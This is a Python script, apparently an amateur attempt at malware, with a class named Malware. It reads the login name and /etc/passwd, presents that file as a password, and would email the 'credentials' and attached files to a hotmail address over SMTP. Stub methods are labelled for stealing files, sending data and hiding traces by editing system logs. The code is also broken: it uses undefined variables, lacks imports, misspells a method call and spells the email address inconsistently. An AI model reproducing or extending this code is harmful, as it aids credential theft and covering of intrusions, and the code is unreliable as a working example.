import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import socket
import threading
import random
import string

class Malware:
    def __init__(self, recipient):
        self.recipient = recipient

    def send_email(self):
        # Create a message
        msg = MIMEMultipart()
        msg['From'] = 'juleslaglobule@hotmail.com'
        msg['To'] = self.recipient
        msg['Subject'] = 'twixforever'

        # Add the text of the email
        text = "Bonjour,\n\nJe vous écris pour vous signaler que votre système a été piraté.\nVoici les informations d'identification : \n Utilisateur : {}\n Mot de passe : {}".format(user, password)
        msg.attach(MIMEText(text, 'plain'))

        # Add any attachments
        attachments = ["file1.txt", "file2.pdf"]
        for attachment in attachments:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(open(attachment, 'rb').read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{attachment}"')
            msg.attach(part)

        # Send the email
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login("juleslaglobule@hotmail.com", "your_password_here")
        server.sendmail("juleslagblobule@hotmail.com", self.recipient, msg.as_string())
        server.quit()

        print("L'email a été envoyée avec succès.")

    def get_info(self):
        # Get the user name
        user = os.getlogin()

        # Get the password
        password = os.popen("cat /etc/passwd").read().strip()

        return user, password

    def steal_files(self):
        # Copy any files of interest to a directory on your machine
        # This is where you would put the code for copying files
        pass

    def send_data(self):
        # Send any stolen data via email
        # This is where you would put the code for sending data
        pass

    def hide_traces(self):
        # Delete any temporary files and update the system logs to remove any signs of your presence
        # This is where you would put the code for hiding traces
        pass

malware = Malware('juleslagglobule@hotmail.com')

if input("Do you wish to continue? (y/n) ") == 'y':
    user, password = malware.get_info()
    print(f"Username: {user}")
    print(f"Password: {password}")

    if input("Do you want to steal files? (y/n) ") == 'y':
        malware.steel_files()

    if input("Do you want to send the data? (y/n) ") == 'y':
        malware.send_data()

    if input("Do you want to hide traces? (y/n) ") == 'y':
        malware.hide_traces()
else:
    print("Goodbye!")
